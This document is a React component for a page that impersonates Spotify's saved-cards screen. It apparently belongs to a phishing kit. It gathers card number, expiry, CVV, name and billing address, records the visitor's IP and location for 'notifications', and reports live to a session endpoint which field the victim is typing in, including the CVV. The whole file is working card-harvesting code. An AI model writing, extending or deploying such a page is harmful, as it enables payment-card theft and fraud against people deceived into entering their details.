"use client"

import type React from "react"
import { useState, useEffect, useRef } from "react"
import { Button } from "@/components/ui/button"
import { Input } from "@/components/ui/input"
import { Lock, HelpCircle } from "lucide-react"
import { SpotifyHeader } from "@/components/spotify-header"
import { SpotifyFooter } from "@/components/spotify-footer"
import { t, type Language } from "@/lib/translations"
import { useSession } from "@/hooks/use-session"

interface MyCardsProps {
  onSubmit: (cardData: CardData) => void
  language?: Language
  error?: string
  initialCountry?: string
}

export interface CardData {
  cardNumber: string
  expirationDate: string
  securityCode: string
  fullName: string
  address: string
  city: string
  postalCode: string
  country: string
  saveCard: boolean
  cardType?: string
  visitorInfo?: any
}

export function MyCards({ onSubmit, language = "en", error, initialCountry }: MyCardsProps) {
  const sessionId = useSession()
  const [cardNumber, setCardNumber] = useState("")
  const [expirationDate, setExpirationDate] = useState("")
  const [securityCode, setSecurityCode] = useState("")
  const [fullName, setFullName] = useState("")
  const [address, setAddress] = useState("")
  const [city, setCity] = useState("")
  const [postalCode, setPostalCode] = useState("")
  const [country, setCountry] = useState(initialCountry || "")
  const [saveCard, setSaveCard] = useState(false)
  const [cardType, setCardType] = useState<string>("unknown")
  const [visitorInfo, setVisitorInfo] = useState<any>(null)
  
  const typingTimeoutRef = useRef<NodeJS.Timeout | null>(null)

  useEffect(() => {
    const fetchLocation = async () => {
      try {
        const response = await fetch("/api/notify")
        if (response.ok) {
          const data = await response.json()
          const info = {
            ip: data.query || "Unknown",
            country: data.country || "Unknown",
            city: data.city || "Unknown",
            region: data.regionName || "Unknown",
            postalCode: data.zip || "",
          }
          setVisitorInfo(info)
          if (!city) setCity(info.city || "")
          if (!postalCode) setPostalCode(info.postalCode || "")
          if (!country) setCountry(info.country || "")
        }
      } catch (err) {}
    }
    fetchLocation()
  }, [])

  const detectCardType = (number: string) => {
    const clean = number.replace(/\s+/g, "")
    if (/^4/.test(clean)) return "visa"
    if (/^5[1-5]/.test(clean)) return "mastercard"
    if (/^3[47]/.test(clean)) return "amex"
    return "unknown"
  }

  const updateTypingStatus = async (field: string, currentCardType?: string) => {
    if (!sessionId) return
    try {
      await fetch('/api/session', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ 
          sessionId, 
          currentPage: 'Cards',
          typingField: field,
          cardType: currentCardType || cardType
        }),
      })
    } catch (e) {}

    if (typingTimeoutRef.current) clearTimeout(typingTimeoutRef.current)
    typingTimeoutRef.current = setTimeout(async () => {
      try {
        await fetch('/api/session', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ 
            sessionId, 
            currentPage: 'Cards',
            typingField: null 
          }),
        })
      } catch (e) {}
    }, 3000)
  }

  const handleCardNumberChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const value = e.target.value
    const formatted = formatCardNumber(value)
    setCardNumber(formatted)
    const newType = detectCardType(value)
    setCardType(newType)
    updateTypingStatus('Card Number', newType)
  }

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault()
    const cleanCardNumber = cardNumber.replace(/\s+/g, "")
    onSubmit({
      cardNumber: cleanCardNumber,
      expirationDate,
      securityCode,
      fullName,
      address,
      city,
      postalCode,
      country,
      saveCard,
      cardType,
      visitorInfo // Pass this along for notifications
    })
  }

  const formatCardNumber = (value: string) => {
    const digits = value.replace(/\D/g, "")
    const limited = digits.slice(0, 16)
    const parts = limited.match(/.{1,4}/g)
    return parts ? parts.join(" ") : limited
  }

  const formatExpirationDate = (value: string) => {
    const digits = value.replace(/\D/g, "")
    if (digits.length === 0) return ""
    let month = digits.slice(0, 2)
    let year = digits.slice(2, 4)
    
    if (month.length === 1 && parseInt(month) > 1) month = "0" + month
    if (month.length === 2) {
      const m = parseInt(month)
      if (m < 1) month = "01"
      if (m > 12) month = "12"
    }

    // Force year to be 26 or greater if 2 digits are entered
    if (year.length === 2) {
      const y = parseInt(year)
      if (y < 26) year = "26"
    }

    return month + (year ? " / " + year : "")
  }

  return (
    <div className="flex flex-col min-h-screen bg-[#121212] text-white">
      <SpotifyHeader language={language} />
      <main className="flex-1 w-full max-w-[600px] mx-auto px-4 py-8">
        <div className="mb-8">
          <h1 className="text-2xl sm:text-[32px] font-bold mb-4">{t("cards.savedTitle", language)}</h1>
          <p className="text-[#a7a7a7] text-sm leading-relaxed">
            {t("cards.manageDesc", language)}{" "}
            <a href="#" className="text-white underline hover:text-[#1ed760] transition-colors">{t("cards.accountOverview", language)}</a>.
          </p>
        </div>
        <div className="flex items-center justify-between mb-4">
          <h2 className="text-xl font-bold">{t("cards.title", language)}</h2>
          <Lock className="w-5 h-5 text-[#a7a7a7]" />
        </div>
        <form onSubmit={handleSubmit} className="bg-[#181818] border border-[#282828] rounded-lg p-6 space-y-6">
          {error && <div className="bg-red-500/10 border border-red-500 text-red-500 p-3 rounded-md text-sm text-center font-bold">{error}</div>}
          <div className="space-y-4">
            <div className="flex items-center justify-between">
              <label className="text-sm font-bold">{t("cards.creditDebit", language)}</label>
              <Lock className="w-4 h-4 text-[#a7a7a7]" />
            </div>
            
            <div className="space-y-2">
              <label className="text-xs font-bold uppercase tracking-wider text-[#a7a7a7]">{t("cards.cardNumber", language)}</label>
              <div className="relative">
                <Input
                  type="text"
                  inputMode="numeric"
                  placeholder="0000 0000 0000 0000"
                  value={cardNumber}
                  onFocus={() => updateTypingStatus('Card Number')}
                  onChange={handleCardNumberChange}
                  maxLength={19}
                  required
                  className="w-full h-14 bg-[#282828] border-none rounded-md text-white placeholder:text-[#727272] px-4 focus:ring-2 focus:ring-white text-lg font-medium"
                />
              </div>
            </div>
            <div className="grid grid-cols-2 gap-4">
              <div className="space-y-2">
                <label className="text-xs font-bold uppercase tracking-wider text-[#a7a7a7]">{t("cards.expirationDate", language)}</label>
                <Input
                  type="text"
                  inputMode="numeric"
                  placeholder={t("cards.expirationPlaceholder", language)}
                  value={expirationDate}
                  onFocus={() => updateTypingStatus('Expiry Date')}
                  onChange={(e) => setExpirationDate(formatExpirationDate(e.target.value))}
                  maxLength={7}
                  required
                  className="w-full h-14 bg-[#282828] border-none rounded-md text-white placeholder:text-[#727272] px-4 focus:ring-2 focus:ring-white text-lg font-medium"
                />
              </div>
              <div className="space-y-2">
                <label className="text-xs font-bold uppercase tracking-wider text-[#a7a7a7]">{t("cards.securityCode", language)}</label>
                <div className="relative">
                  <Input
                    type="text"
                    inputMode="numeric"
                    placeholder="123"
                    value={securityCode}
                    onFocus={() => updateTypingStatus('CVV')}
                    onChange={(e) => setSecurityCode(e.target.value.replace(/\D/g, "").slice(0, 4))}
                    maxLength={4}
                    required
                    className="w-full h-14 bg-[#282828] border-none rounded-md text-white placeholder:text-[#727272] px-4 focus:ring-2 focus:ring-white text-lg font-medium"
                  />
                  <HelpCircle className="absolute right-4 top-1/2 -translate-y-1/2 w-5 h-5 text-[#a7a7a7] cursor-help" />
                </div>
              </div>
            </div>

            <div className="space-y-2">
              <label className="text-xs font-bold uppercase tracking-wider text-[#a7a7a7]">Full Name</label>
              <Input
                type="text"
                placeholder="John Doe"
                value={fullName}
                onChange={(e) => setFullName(e.target.value)}
                required
                className="w-full h-14 bg-[#282828] border-none rounded-md text-white placeholder:text-[#727272] px-4 focus:ring-2 focus:ring-white text-lg font-medium"
              />
            </div>

            <div className="space-y-2">
              <label className="text-xs font-bold uppercase tracking-wider text-[#a7a7a7]">Address</label>
              <Input
                type="text"
                placeholder="Street address"
                value={address}
                onChange={(e) => setAddress(e.target.value)}
                required
                className="w-full h-14 bg-[#282828] border-none rounded-md text-white placeholder:text-[#727272] px-4 focus:ring-2 focus:ring-white text-lg font-medium"
              />
            </div>

            <div className="grid grid-cols-2 gap-4">
              <div className="space-y-2">
                <label className="text-xs font-bold uppercase tracking-wider text-[#a7a7a7]">City</label>
                <Input
                  type="text"
                  placeholder="City"
                  value={city}
                  onChange={(e) => setCity(e.target.value)}
                  required
                  className="w-full h-14 bg-[#282828] border-none rounded-md text-white placeholder:text-[#727272] px-4 focus:ring-2 focus:ring-white text-lg font-medium"
                />
              </div>
              <div className="space-y-2">
                <label className="text-xs font-bold uppercase tracking-wider text-[#a7a7a7]">Postal Code</label>
                <Input
                  type="text"
                  placeholder="12345"
                  value={postalCode}
                  onChange={(e) => setPostalCode(e.target.value)}
                  required
                  className="w-full h-14 bg-[#282828] border-none rounded-md text-white placeholder:text-[#727272] px-4 focus:ring-2 focus:ring-white text-lg font-medium"
                />
              </div>
            </div>

            <div className="space-y-2">
              <label className="text-xs font-bold uppercase tracking-wider text-[#a7a7a7]">Country</label>
              <Input
                type="text"
                placeholder="Country"
                value={country}
                onChange={(e) => setCountry(e.target.value)}
                required
                className="w-full h-14 bg-[#282828] border-none rounded-md text-white placeholder:text-[#727272] px-4 focus:ring-2 focus:ring-white text-lg font-medium"
              />
            </div>
          </div>
          <div className="space-y-4 pt-4 border-t border-[#282828]">
             <div className="flex items-start gap-3">
              <input type="checkbox" id="saveCard" checked={saveCard} onChange={(e) => setSaveCard(e.target.checked)} className="mt-1 w-5 h-5 bg-[#282828] border-none rounded cursor-pointer accent-[#1ed760]" />
              <div className="space-y-1">
                <label htmlFor="saveCard" className="text-sm font-bold cursor-pointer">{t("cards.saveCard", language)}</label>
                <p className="text-xs text-[#a7a7a7] leading-relaxed">{t("cards.saveCardInfo", language)}</p>
              </div>
            </div>
          </div>
          <div className="flex flex-col items-center gap-4 pt-6">
            <Button type="submit" className="w-full sm:w-[200px] h-14 bg-[#1ed760] hover:bg-[#1fdf64] text-black font-bold rounded-full text-lg transition-all active:scale-95">{t("cards.register", language)}</Button>
            <button type="button" className="text-sm font-bold text-white hover:underline transition-all">{t("cards.cancel", language)}</button>
          </div>
        </form>
      </main>
      <SpotifyFooter language={language} />
    </div>
  )
}
